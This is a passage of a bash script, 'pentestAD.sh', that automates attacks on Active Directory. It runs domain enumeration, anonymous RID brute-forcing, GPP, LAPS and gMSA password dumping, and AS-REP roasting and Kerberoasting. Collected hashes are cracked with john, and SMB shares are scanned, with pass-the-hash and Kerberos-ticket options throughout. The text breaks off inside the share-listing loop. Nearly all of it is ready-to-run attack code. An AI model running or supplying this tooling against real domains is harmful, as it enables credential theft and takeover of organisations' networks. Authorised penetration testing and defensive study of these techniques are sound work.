#!/bin/bash
#
# Author: lefayjey
# Latest update : 03/01/2022
#

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

#Default variables
user="guest"
password=""
modules="ad_enum,kerberos,scan_shares"
output_dir="/tmp"
pass_list="/usr/share/wordlists/rockyou.txt"
users_list="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
lsassy_bool=true
nslookup_ran=false
servers_ip_list=""

#Tools variables
impacket_dir="/usr/local/bin"
bloodhound=$(which bloodhound-python)
ldapdomaindump=$(which ldapdomaindump)
crackmapexec=$(which crackmapexec)
john=$(which john)
smbmap=$(which smbmap)
nmap=$(which nmap)
lsassy=$(which lsassy)
kerbrute=$(which kerbrute)
rpcclient=$(which rpcclient)
scripts_dir="."

help_pentest () {
    echo -e "${YELLOW}Usage (default) ${NC}"
    echo -e "./$(basename "$0") -t dc_ip" >&2;
    echo -e "./$(basename "$0") -d domain -u user -p password_or_hash(LM:NT)_or_kerbticket(./krb5cc_ticket) -t dc_ip" >&2;
    echo -e ""
    echo -e "${YELLOW}Usage (run user modules) ${NC}"
    echo -e "./$(basename "$0") -M user -d domain [-u user -p password_or_hash(LM:NT)_or_kerbticket(./krb5cc_ticket)] -t dc_ip -o output_dir [-S <domain_servers_list>]" >&2;
    echo -e ""
    echo -e "${YELLOW}Usage (run Password Dump - requires admin rights) ${NC}"
    echo -e "./$(basename "$0") -M pwd_dump -d domain [-u user -p password_or_hash(LM:NT)_or_kerbticket(./krb5cc_ticket)] -t dc_ip -o output_dir [-L] [-S <domain_servers_list>]" >&2; 
    echo -e ""
    echo -e "${YELLOW}Usage (run all modules) ${NC}"
    echo -e "./$(basename "$0") -M all -d domain [-u user -p password_or_hash(LM:NT)_or_kerbticket(./krb5cc_ticket)] -t dc_ip -o output_dir [-L] [-S <domain_servers_list>]" >&2; 
    echo -e ""
    echo -e "" 
    echo -e "Optional parameters"
    echo -e "Use -S with scan_shares or pwd_dump to specify list of target IPs  and skip nslookup"
    echo -e "Use -L with pwd_dump to skip execution of lsassy"
    echo -e "Use -U to override default username list"
    echo -e "Use -P to override default password list"
}

while getopts ":d:u:p:t:M:S:o:U:P:Lh" opt; do
  case $opt in
    d) domain="${OPTARG}";;
    u) user="${OPTARG}";; #leave empty for anonymous login
    p) password="${OPTARG}";; #password or NTLM hash or location of krb5cc ticket
    t) dc_ip="${OPTARG}";; #mandatory
    M) modules="${OPTARG}";; #comma separated modules to run
    S) servers_ip_list="${OPTARG}";; #list of IP addresses and skip nslookup
    o) output_dir="${OPTARG}";;
    L) lsassy_bool=false;;
    U) users_list="${OPTARG}";;
    P) pass_list="${OPTARG}";;
    h) help_pentest; exit;;
    \?) echo -e "Unknown option: -${OPTARG}" >&2; exit 1;;
  esac
done

main () {
    echo -e "${YELLOW}[####### START #######] Executing pentestAD.sh script on $(date) ${NC}"
    echo -e ""

    prepare

    for i in $(echo $modules | sed "s/,/ /g"); do
        case $i in
            ad_enum)
            echo -e "${GREEN}[##### Active Directory Enumeration #####]${NC}"
            ad_enum
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            ;;

            kerberos)
            echo -e "${GREEN}[##### Kerberos-based Attacks #####]${NC}"
            kerberos
            echo -e "${GREEN}------------------------------------${NC}"
            echo -e ""
            ;;

            scan_shares)
            echo -e "${GREEN}[##### SMB Shares Scan #####]${NC}"
            scan_smb_shares
            echo -e "${GREEN}-----------------------------${NC}"
            echo -e ""
            ;;

            pwd_dump)
            echo -e "${GREEN}[##### Password Dump #####]${NC}"
            remote_pwd_dump
            echo -e "${GREEN}---------------------------${NC}"
            echo -e ""
            ;;

            all)
            echo -e "${GREEN}[##### Active Directory Enumeration #####]${NC}"
            ad_enum
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### Kerberos-based Attacks #####]${NC}"
            kerberos
            echo -e "${GREEN}------------------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### SMB Shares Scan #####]${NC}"
            scan_smb_shares
            echo -e "${GREEN}-----------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### Password Dump #####]${NC}"
            remote_pwd_dump
            echo -e "${GREEN}---------------------------${NC}"
            echo -e ""
            ;;

            user)
            echo -e "${GREEN}[##### Active Directory Enumeration #####]${NC}"
            ad_enum
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### Kerberos-based Attacks #####]${NC}"
            kerberos
            echo -e "${GREEN}------------------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### SMB Shares Scan #####]${NC}"
            scan_smb_shares
            echo -e "${GREEN}-----------------------------${NC}"
            echo -e ""
            ;;

            *)
            echo -e "${YELLOW}[### SKIP ###] Unknown module $i.. ${NC}"
            echo -e ""
            ;;
        esac
    done

    echo -e "${YELLOW}[####### END #######] pentestAD.sh script complete! Output folder is $(realpath $output_dir)${NC}"
}

prepare (){
    if [ -z "$dc_ip" ] ; then
        echo -e "${RED}[### FAIL ###] Missing target ... ${NC}"
        echo -e "Use -h for help"
        exit 1
    fi

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${CYAN}[### FAIL ###] Please run setup.sh and try again...${NC}"
        exit 1
    else
        dc_info=$(${crackmapexec} smb ${dc_ip})
    fi

    dc_NETBIOS=$(echo $dc_info| cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
    dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)
    dc_FQDN=${dc_NETBIOS}"."${dc_domain}

    if [ -z "$domain" ] ; then
            domain=${dc_domain}
    fi

    echo -e "${YELLOW}[##### INFO #####] The target Domain Controller's FQDN is ${dc_FQDN} ... ${NC}"

    anon_bool=false
    hash_bool=false
    kerb_bool=false

    #Check if anonymous authentication is used
    if [ "${password}" == "" ] ; then
        anon_bool=true
        echo -e "${YELLOW}[##### INFO #####] Using anonymous authentication or empty password on domain ${dc_domain} ... ${NC}"
        echo -e ""

    #Check if NTLM hash is used, and complete with empty LM hash
    elif ([ "${#password}" -eq 65 ] && [ "$(expr substr $password 33 1)" == ":" ]) || ([ "${#password}" -eq 33 ] && [ "$(expr substr $password 1 1)" == ":" ]) ; then
        hash_bool=true
        hash=$password
        if [ "$(echo $hash | cut -d ":" -f 1)" == "" ]; then
            hash="aad3b435b51404eeaad3b435b51404ee"$hash
        fi
        echo -e "${YELLOW}[##### INFO #####] Using Pass-The-Hash with provided NTLM hash of ${user} on domain ${dc_domain} ... ${NC}"
        echo -e ""

    #Check if kerberos ticket is used
    elif [ -f "${password}" ] ; then
        kerb_bool=true
        kerb_ticket=$password
        export KRB5CCNAME=$kerb_ticket
        echo -e "${YELLOW}[##### INFO #####] Using provided Kerberos Ticket of $user located at $kerb_ticket on domain ${dc_domain} ... ${NC}"
        echo -e ""
    else
        echo -e "${YELLOW}[##### INFO #####] Using provided password of ${user} on domain ${dc_domain} ... ${NC}"
        echo -e ""
    fi
}

run_nslookup () {
    echo -e "${BLUE}[### START ###] DNS lookup of servers${NC}"
    servers_list="${full_output_dir}/servers_list_${domain}.txt"

    if [ -f "${servers_ip_list}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] IP addresses list specified, skipping nslookup.. ${NC}"
        echo -e ""
    elif [ ! -f "${servers_list}" ] ; then
        echo -e "${RED}[### FAIL ###] Error accessing servers file.. ${NC}"
        echo -e ""
    else
        mkdir -p ${full_output_dir}/Scans
        for i in $(cat ${servers_list}); do
            nslookup $i ${dc_ip} | grep "Name:" -A2 >> ${full_output_dir}/Scans/nslookup_all_${domain}.txt
        done

        cat ${full_output_dir}/Scans/nslookup_all_${domain}.txt | sed "s/Name:\t\|Address: //g;" | sed -e ':a;N;$!ba; s/\n\n/CHAR_SEP/g; s/\n/;/g; s/CHAR_SEP/\n/g' > ${full_output_dir}/Scans/nslookup_all_${domain}.csv
        cat ${full_output_dir}/Scans/nslookup_all_${domain}.txt | grep "Address: " | sed "s/Address: //g" | grep -v "127\.0\.0" | sort -u > ${full_output_dir}/ip_list_${domain}.txt
        servers_ip_list="${full_output_dir}/ip_list_${domain}.txt"
    fi
    nslookup_ran=true
    echo -e "${BLUE}[### END ###] DNS lookup of servers${NC}"
    echo -e ""
}

ad_enum () {
    full_output_dir="${output_dir}/${domain}"
    mkdir -p ${full_output_dir}

    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of bloodhound${NC}"
        echo -e ""
    elif [[ ! "$(${nmap} -Pn ${dc_ip} -p 389 2>/dev/null | grep open)" ]] && [[ ! "$(${nmap} -Pn ${dc_ip} -p 636 2>/dev/null | grep open)" ]] ; then
        echo -e "${YELLOW}[### SKIP ###] BloodHound enum - Ports 389 and 636 are closed on the DC${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] BloodHound enum${NC}"
        mkdir -p ${full_output_dir}/BloodHound
        current_dir=$(pwd)
        cd ${full_output_dir}/BloodHound
        if [ "${anon_bool}" == true ] ; then
                echo -e "${YELLOW}[### SKIP ###] BloodHound requires credentials${NC}"
        elif [ "${hash_bool}" == true ] ; then 
                ${bloodhound} -d ${dc_domain} -u ${user} --hashes ${hash} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 15 --dns-tcp
        elif [ "${kerb_bool}" == true ] ; then
                ${bloodhound} -d ${dc_domain} -u ${user} -k -c all,LoggedOn -ns ${dc_ip} --dns-timeout 15 --dns-tcp
        else
                ${bloodhound} -d ${dc_domain} -u ${user} -p ${password} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 15 --dns-tcp
        fi
        cd ${current_dir}
        echo -e "${BLUE}[### END ###] BloodHound enum${NC}"
        echo -e ""
    fi

    if [ ! -f "${ldapdomaindump}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of ldapdomaindump${NC}"
        echo -e ""
    elif [[ ! "$(${nmap} -Pn ${dc_ip} -p 389 2>/dev/null | grep open)" ]] && [[ ! "$(${nmap} -Pn ${dc_ip} -p 636 2>/dev/null | grep open)" ]] ; then
        echo -e "${YELLOW}[### SKIP ###] ldapdomain enum - Ports 389 and 636 are closed on the DC${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] ldapdomain enum${NC}"
        mkdir -p ${full_output_dir}/LDAPDump
        if [ "${anon_bool}" == true ] ; then
                ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${full_output_dir}/LDAPDump 2>/dev/null
        elif [ "${hash_bool}" == true ] ; then 
                ${ldapdomaindump} -u ${domain}\\${user} -p ${hash} ldap://${dc_ip} --no-json -o ${full_output_dir}/LDAPDump 2>/dev/null
        elif [ "${kerb_bool}" == true ] ; then
                echo -e "${YELLOW}[### SKIP ###] ldapdomain does not support kerberos tickets${NC}"
        else
                ${ldapdomaindump} -u ${domain}\\${user} -p ${password} ldap://${dc_ip} --no-json -o ${full_output_dir}/LDAPDump 2>/dev/null
        fi
        echo -e "${BLUE}[### END ###] ldapdomain enum${NC}"
        echo -e ""

        #Parsing user and computer lists
        /bin/cat ${full_output_dir}/LDAPDump/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${full_output_dir}/users_list_ldap_${domain}.txt 2>&1

        /bin/cat ${full_output_dir}/LDAPDump/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${full_output_dir}/servers_list_${domain}.txt 2>&1
        echo ${dc_FQDN} >> ${full_output_dir}/servers_list_${domain}.txt 2>&1
    fi

    if [ ! -f "${rpcclient}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of rpcclient${NC}"
        echo -e ""
    else
        if [ "${anon_bool}" == true ] ; then
            echo -e "${BLUE}[### START ###] rpcclient enum${NC}"
                echo "enumdomusers" | rpcclient -U "" -N ${dc_ip} > ${full_output_dir}/rpcclient_${domain}.txt
                /bin/cat ${full_output_dir}/rpcclient_${domain}.txt 2>/dev/null | cut -d "[" -f 2 | cut -d "]" -f 1 | tee ${full_output_dir}/users_list_rpcclient_${domain}.txt
            echo -e "${BLUE}[### END ###] rpcclient enum${NC}"
            echo -e ""
        fi
    fi

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of crackmapexec${NC}"
        echo -e ""
    else
        if [ "${anon_bool}" == true ] ; then
            echo -e "${BLUE}[### START ###] crackmapexec enum${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p "" --rid-brute | tee ${full_output_dir}/rid_brute_${domain}.txt
            /bin/cat ${full_output_dir}/rid_brute_${domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2| sed "s/ (SidTypeUser)\x1B\[0m//g" | tee ${full_output_dir}/users_list_ridbrute_${domain}.txt 2>&1         
            /bin/cat ${full_output_dir}/users_list_*_${domain}.txt 2>/dev/null | sort -uf > ${full_output_dir}/users_list_sorted_${domain}.txt 2>&1
            echo -e "${BLUE}[### END ###] crackmapexec enum${NC}"
            echo -e ""
        fi
    fi

    if [ "${nslookup_ran}" == false ] ; then
        run_nslookup
    fi

    if [[ ! -f "${impacket_dir}/findDelegation.py" ]] && [[ ! -f "${impacket_dir}/Get-GPPPassword.py)" ]] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of impacket${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] impacket enum${NC}"
        if [ "${anon_bool}" == true ] ; then
            if [ -f "${servers_ip_list}" ] ; then
                mkdir -p ${full_output_dir}/RPCDump
                for i in $(cat ${servers_ip_list}); do
                    echo -e "${CYAN}[# Start #] rpcdump of ${i} ${NC}"
                    /usr/bin/python3 ${impacket_dir}/rpcdump.py $i > ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt
                    grep 'MS-RPRN\|MS-PAR' ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt | tee ${full_output_dir}/RPCDump/MS-RPRN_MS-PAR_output_${i}.txt
                    grep 'MS-EFSR' ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt | tee ${full_output_dir}/RPCDump/MS-EFSR_output_${i}.txt
                    echo -e "${CYAN}[# End #] rpcdump of ${i} ${NC}"
                done
            else
                echo -e "${YELLOW}[### SKIP ###] RPC dump enum${NC}"
            fi
        elif [ "${hash_bool}" == true ] ; then 
            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -hashes ${hash} | tee ${full_output_dir}/Get-GPPPassword_output_${domain}.txt
            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} | tee ${full_output_dir}/findDelegation_output_${domain}.txt
    
            if [ -f "${servers_ip_list}" ] ; then
                mkdir -p ${full_output_dir}/RPCDump
                for i in $(cat ${servers_ip_list}); do
                    echo -e "${CYAN}[# Start #] rpcdump of ${i} ${NC}"
                    /usr/bin/python3 ${impacket_dir}/rpcdump.py ${domain}/${user}@$i -hashes ${hash} > ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt
                    grep 'MS-RPRN\|MS-PAR' ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt | tee ${full_output_dir}/RPCDump/MS-RPRN_MS-PAR_output_${i}.txt
                    grep 'MS-EFSR' ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt | tee ${full_output_dir}/RPCDump/MS-EFSR_output_${i}.txt
                    echo -e "${CYAN}[# End #] rpcdump of ${i} ${NC}"
                done
            else
                echo -e "${YELLOW}[### SKIP ###] RPC dump enum${NC}"
            fi

        elif [ "${kerb_bool}" == true ] ; then
            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -k -no-pass | tee ${full_output_dir}/Get-GPPPassword_output_${domain}.txt
            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} | tee ${full_output_dir}/findDelegation_output_${domain}.txt
            echo -e "${YELLOW}[### SKIP ###] RPC dump enum${NC}"
        else
            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}:${password}@${dc_ip} | tee ${full_output_dir}/Get-GPPPassword_output_${domain}.txt
            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user}:${password} -dc-ip ${dc_ip} | tee ${full_output_dir}/findDelegation_output_${domain}.txt
            
            if [ -f "${servers_ip_list}" ] ; then
                mkdir -p ${full_output_dir}/RPCDump
                for i in $(cat ${servers_ip_list}); do
                    echo -e "${CYAN}[# Start #] rpcdump of ${i} ${NC}"
                    /usr/bin/python3 ${impacket_dir}/rpcdump.py ${domain}/${user}:${password}@$i > ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt
                    grep 'MS-RPRN\|MS-PAR' ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt | tee ${full_output_dir}/RPCDump/MS-RPRN_MS-PAR_output_${i}.txt
                    grep 'MS-EFSR' ${full_output_dir}/RPCDump/rpcdump_output_${i}.txt | tee ${full_output_dir}/RPCDump/MS-EFSR_output_${i}.txt
                    echo -e "${CYAN}[# End #] rpcdump of ${i} ${NC}"
                done
            else
                    echo -e "${YELLOW}[### SKIP ###] RPC dump enum${NC}"
            fi
        fi
        if [ "${anon_bool}" == false ] ; then
            if grep -q 'error' ${full_output_dir}/findDelegation_output_${domain}.txt; then
                echo -e "${RED}[### FAIL ###] Errors during Delegation enum... ${NC}"
            fi
        fi
        echo -e "${BLUE}[### END ###] impacket enum${NC}"
        echo -e ""
    fi

    if [ ! -f "${scripts_dir}/laps.py" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the location of laps.py${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] LAPS Dump${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] LAPS Dump requires credentials${NC}"
        elif [ "${hash_bool}" == true ] ; then 
            /usr/bin/python3 ${scripts_dir}/laps.py -d ${domain} -u ${user} -p ${hash} -l ${dc_ip} 2>/dev/null > ${full_output_dir}/laps_dump_${domain}.txt
        elif [ "${kerb_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] laps.py does not support kerberos tickets${NC}"
        else
            /usr/bin/python3 ${scripts_dir}/laps.py -d ${domain} -u ${user} -p ${password} -l ${dc_ip} 2>/dev/null > ${full_output_dir}/laps_dump_${domain}.txt
        fi
        echo -e "${BLUE}[### END ###] LAPS Dump${NC}"
        echo -e ""
    fi

    if [ ! -f "${scripts_dir}/gMSADumper.py" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the location of gMSADumper.py${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] gMSA Dump${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] gMSA Dump requires credentials${NC}"
        elif [ "${hash_bool}" == true ] ; then 
            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -p ${hash} -l ${dc_ip} 2>/dev/null > ${full_output_dir}/gMSA_dump_${domain}.txt
        elif [ "${kerb_bool}" == true ] ; then
            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -k 2>/dev/null > ${full_output_dir}/gMSA_dump_${domain}.txt
        else
            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -p ${password} -l ${dc_ip} 2>/dev/null > ${full_output_dir}/gMSA_dump_${domain}.txt
        fi
        echo -e "${BLUE}[### END ###] gMSA Dump${NC}"
        echo -e ""
    fi
}

kerberos () {
    full_output_dir="${output_dir}/${domain}"
    mkdir -p ${full_output_dir}/Kerberoast
    
    if [ ! -f "${kerbrute}" ] ;  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of kerbrute${NC}"
        echo -e ""
    elif [[ ! "$(${nmap} -Pn ${dc_ip} -p 88 2>/dev/null | grep open)" ]]  ; then
        echo -e "${YELLOW}[### SKIP ###] Kerbrute - Port 88 is closed on the DC${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] kerbrute Usernames${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[##### INFO #####] Using $users_list wordlist for user enumeration ... ${NC}"
            ${kerbrute} -users ${users_list} -domain ${domain} -dc-ip ${dc_ip} -no-save-ticket -outputusers ${full_output_dir}/users_list_kerbrute_${domain}.txt | tee ${full_output_dir}/Kerberoast/kerbrute_output_${domain}.txt 2>&1
            /bin/cat ${full_output_dir}/users_list_*_${domain}.txt 2>/dev/null | sort -uf > ${full_output_dir}/users_list_sorted_${domain}.txt 2>&1
        fi
        echo -e "${BLUE}[### END ###] kerbrute Usernames${NC}"
        echo -e ""
    fi

        if [ ! -f "${impacket_dir}/GetNPUsers.py" ] ;  then
            echo -e "${YELLOW}[### SKIP ###] Please verify the installation of impacket${NC}"
            echo -e ""
        elif [[ ! "$(${nmap} -Pn ${dc_ip} -p 88 2>/dev/null | grep open)" ]]  ; then
            echo -e "${YELLOW}[### SKIP ###] AS REP Roasting - Port 88 is closed on the DC${NC}"
            echo -e ""
        else
            echo -e "${BLUE}[### START ###] AS REP Roasting Attack${NC}"
            if [ "${anon_bool}" == true ] ; then
                known_users_list="${full_output_dir}/users_list_sorted_${domain}.txt"
                if [ -s "${known_users_list}" ] ;  then
                    users_list=${known_users_list}
                fi
                /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${full_output_dir}/Kerberoast/asreproast_output_${domain}.txt 2>&1
            elif [ "${hash_bool}" == true ] ; then
                /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip}
                /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} > ${full_output_dir}/Kerberoast/asreproast_output_${domain}.txt
            elif [ "${kerb_bool}" == true ] ; then
                /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip}        
                /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} > ${full_output_dir}/Kerberoast/asreproast_output_${domain}.txt
            else
                /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
                /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} > ${full_output_dir}/Kerberoast/asreproast_output_${domain}.txt
            fi
            if grep -q 'error' ${full_output_dir}/Kerberoast/asreproast_output_${domain}.txt; then
                echo -e "${RED}[### FAIL ###] Errors during AS REP Roasting Attack... ${NC}"
            else
                /bin/cat ${full_output_dir}/Kerberoast/asreproast_output_${domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${full_output_dir}/Kerberoast/asreproast_hashes_${domain}.txt 2>&1
            fi
            echo -e "${BLUE}[### END ###] AS REP Roasting Attack${NC}"
            echo -e ""
        fi
                
        if [ ! -f "${impacket_dir}/GetUserSPNs.py" ] ;  then
            echo -e "${YELLOW}[### SKIP ###] Please verify the installation of impacket${NC}"
            echo -e ""
        elif [[ ! "$(${nmap} -Pn ${dc_ip} -p 88 2>/dev/null | grep open)" ]]  ; then
            echo -e "${YELLOW}[### SKIP ###] Kerberoasting - Port 88 is closed on the DC${NC}"
            echo -e ""
        else
            echo -e "${BLUE}[### START ###] Kerberoast Attack${NC}"
            if [ "${anon_bool}" == true ] ; then
                echo -e "${YELLOW}[### SKIP ###] Kerberoast requires credentials${NC}"
            elif [ "${hash_bool}" == true ] ; then
                /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip}
                /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} > ${full_output_dir}/Kerberoast/kerberoast_output_${domain}.txt
            elif [ "${kerb_bool}" == true ] ; then
                /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip}
                /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} > ${full_output_dir}/Kerberoast/kerberoast_output_${domain}.txt
            else
                /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
                /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} > ${full_output_dir}/Kerberoast/kerberoast_output_${domain}.txt
            fi
            if [ "${anon_bool}" == false ] ; then
                if grep -q 'error' ${full_output_dir}/Kerberoast/kerberoast_output_${domain}.txt; then
                    echo -e "${RED}[### FAIL ###] Errors during Kerberoast Attack... ${NC}"
                else
                    /bin/cat ${full_output_dir}/Kerberoast/kerberoast_output_${domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/'  > ${full_output_dir}/Kerberoast/kerberoast_hashes_${domain}.txt
                    fi
            fi
            echo -e "${BLUE}[### END ###] Kerberoast Attack${NC}"
            echo -e ""
        fi

        #-------------------------------------------Cracking hashes using john the ripper
        if [ ! -f "${john}" ] ;  then
            echo -e "${YELLOW}[### SKIP ###] Please verify the installation of john${NC}"
            echo -e ""
        else
            echo -e "${BLUE}[### START ###] Launching john on collected kerberoast hashes ... ${NC}"

            if [ ! -s ${full_output_dir}/Kerberoast/kerberoast_hashes_${domain}.txt ]; then
                echo -e "${BLUE}[### END ###] john aborted, no SPN accounts found ...${NC}"
            else
                echo -e "${YELLOW}[### INFO ###] Press CTRL-C to abort john ...${NC}"
                $john ${full_output_dir}/Kerberoast/kerberoast_hashes_${domain}.txt --format=krb5tgs --wordlist=$pass_list
                echo -e "${BLUE}[### END ###] Printing cracked Kerberoast hashes ...${NC}"
                $john ${full_output_dir}/Kerberoast/kerberoast_hashes_${domain}.txt --format=krb5tgs --show | tee ${full_output_dir}/Kerberoast/kerberoast_john_results_${domain}.txt
            fi

            echo -e "${BLUE}[### START ###] Launching john on collected asreproast hashes ...${NC}"

            if [ ! -s ${full_output_dir}/Kerberoast/asreproast_hashes_${domain}.txt ]; then
                echo -e "${BLUE}[### END ###] john aborted, no accounts with Kerberos preauth disabled found ...${NC}"
            else
                echo -e "${YELLOW}[### INFO ###] Press CTRL-C to abort john ...${NC}"
                $john ${full_output_dir}/Kerberoast/asreproast_hashes_${domain}.txt --format=krb5asrep --wordlist=$pass_list
                echo -e "${BLUE}[### END ###] Printing cracked AS REP Roast hashes ...${NC}"
                $john ${full_output_dir}/Kerberoast/asreproast_hashes_${domain}.txt --format=krb5asrep --show | tee ${full_output_dir}/Kerberoast/asreproast_john_results_${domain}.txt
            fi
        fi
}

scan_smb_shares () {
        if [ ! -f "${nmap}" ] || [ ! -f "${smbmap}" ];  then
            echo -e "${YELLOW}[### SKIP ###] Please verify the installation of nmap and smbmap${NC}"
            echo -e ""
        else
            full_output_dir="${output_dir}/${domain}"
            mkdir -p ${full_output_dir}/SMBShares
            mkdir -p ${full_output_dir}/Scans
            
            if [ ! -f "${servers_ip_list}" ] ; then
                echo -e "${YELLOW}[### INFO ###] IP addresses list not specified, using nslookup.. ${NC}"
                echo -e ""
                if [ "${nslookup_ran}" == false ] ; then
                    run_nslookup
                else
                    servers_ip_list="${full_output_dir}/ip_list_${domain}.txt"
                fi
            fi
            if [ ! -f "${servers_ip_list}" ] ; then
                echo -e "${RED}[### FAIL ###] Error accessing servers file.. ${NC}"
                echo -e ""
                return 1
            fi

            #--------------------------------------------STEP 1----------------------------------------------------
            echo -e "${BLUE}[### START ###] 1: Listing servers with SMB port open${NC}"

            ${nmap} -p 445 -Pn -iL ${servers_ip_list} -oG ${full_output_dir}/Scans/nmap_smb_scan_${domain}.txt 1>/dev/null 2>&1
            grep -a "open" ${full_output_dir}/Scans/nmap_smb_scan_${domain}.txt | cut -d " " -f 2 > ${full_output_dir}/smb_servers_list_${domain}.txt

            echo -e "${BLUE}[### END ###] 1: Listing servers with SMB port open${NC}"
            echo -e ""

            #--------------------------------------------STEP 2----------------------------------------------------
            echo -e "${BLUE}[### START ###] 2: Listing accessible shares${NC}"

            for i in $(cat ${full_output_dir}/smb_servers_list_${domain}.txt); do
            echo -e "${CYAN}[# Start #] Listing shares of ${i} ${NC}"
            if [ "${anon_bool}" == true ] ; then
                ${smbmap} -H $i -u ${user} -p "" -d ${domain} | grep -v "Working on it..." > ${full_output_dir}/SMBShares/smb_shares_${i}.txt 2>&1
            elif [ "${hash_bool}" == true ] ; then
                ${smbmap} -H $i -u ${user} -p ${hash} -d ${domain} | grep -v "Working on it..." > ${full_output_dir}/SMBShares/smb_shares_${i}.txt 2>&1
            elif [ "${kerb_bool}" == true ] ; then
                echo -e "${YELLOW}[### SKIP ###] Skipping smbmap because using kerberos ticket as authentication${NC}"       
            else
                ${smbmap} -H $i -u ${user} -p ${password} -d ${domain} | grep -v "Working on it..." > ${full_output_dir}/SMBShares/smb_shares_${i}.txt 2>&1
            fi
            echo -e "${CYAN}[# End #] Listing shares of ${i} ${NC}"
            done

